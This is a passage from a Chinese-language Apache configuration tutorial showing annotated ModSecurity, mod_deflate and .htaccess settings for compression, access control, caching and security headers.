<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 响应体访问</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecResponseBodyAccess </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">On</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecResponseBodyMimeType </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/plain</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/html</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/xml</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecResponseBodyLimit </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">524288</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">             # 最大响应体大小</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 临时目录</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecTmpDir /tmp/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 审计日志</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecAuditEngine RelevantOnly            # 仅记录相关事件</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecAuditLogRelevantStatus &quot;^(?:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">|</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(?!</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">04</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">))&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecAuditLogParts ABIJDEFHZ</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecAuditLogType Serial</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecAuditLog /var/log/apache2/modsec_audit.log</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 包含核心规则</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/modsecurity/*.conf</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/modsecurity/crs/crs-setup.conf</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/modsecurity/crs/rules/*.conf</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h5 id="53-mod_deflateconf---压缩模块">5.3 mod_deflate.conf - 压缩模块<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#53-mod_deflateconf---压缩模块" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_deflate.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 压缩文本类型</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/plain</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/xml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/css</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/javascript</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/javascript</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/json</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/xml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/xhtml+xml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/rss+xml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">image/svg+xml</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 排除已压缩的文件</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    SetEnvIfNoCase</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Request_URI \.(?:gif|jpe?g|png|zip|gz|rar|bz2|7z|pdf)$ no-gzip</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 排除旧版浏览器</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    BrowserMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ^Mozilla/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> gzip-only-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    BrowserMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ^Mozilla/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">\.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">678</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">] no-gzip</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    BrowserMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> \bMSI[E] !no-gzip !gzip-only-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 确保代理正确缓存</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> append Vary </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">User</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">-Agent env=!dont-vary</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 压缩级别（1-9，9最高压缩率但最慢）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DeflateCompressionLevel</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 6</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 内存级别（1-9）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DeflateMemLevel</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 9</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 窗口大小（9-15）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DeflateWindowSize</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 15</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<hr/>
<h3 id="6-htaccess文件详解">6. .htaccess文件详解<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-htaccess文件详解" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p><code>.htaccess</code>是目录级配置文件，允许在不重启Apache的情况下更改配置。</p>
<p><strong>注意：</strong> 需要在虚拟主机中设置 <code>AllowOverride All</code> 才能使用。</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== URL重写 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">RewriteEngine</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">RewriteBase</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 强制HTTPS</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTPS}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> off</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://%{HTTP_HOST}/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 访问控制 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 基于IP的访问控制</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ip </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">192</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">168</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">24</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ip </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 拒绝特定IP</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;RequireAll></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> not ip </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/RequireAll></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 基于密码的认证</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AuthType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Basic</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AuthName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;Restricted Area&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AuthUserFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/apache2/.htpasswd</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> valid-user</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 错误页面 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 404</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">404</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 403</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">403</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 500</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">500</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 目录选项 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用目录列表</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -Indexes</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用符号链接跟随</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> +FollowSymLinks</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用MultiViews</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -MultiViews</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 文件保护 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保护特定文件</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Files</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;config.php&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Files</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保护文件扩展名</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;\.(bak|config|sql|log)$&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== MIME类型 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AddType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/x-httpd-php</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> .php .phtml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AddType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> .shtml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AddHandler</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> server-parsed .shtml</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 压缩 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_deflate.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/plain</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/xml</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/css</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/javascript</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 缓存控制 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_expires.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresActive</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/jpeg</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/png</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/css</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> month&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/javascript</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> month&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 安全头 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_headers.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Frame-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;SAMEORIGIN&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Content-Type-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;nosniff&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-XSS-Protection &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; mode=block&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Referrer-Policy &quot;strict-origin-when-cross-origin&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 字符编码 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AddDefaultCharset</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> UTF-</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== PHP配置（如果允许）======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">php_flag</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> display_errors</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Off</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">php_value</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> upload_max_filesize</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10M</span></span>
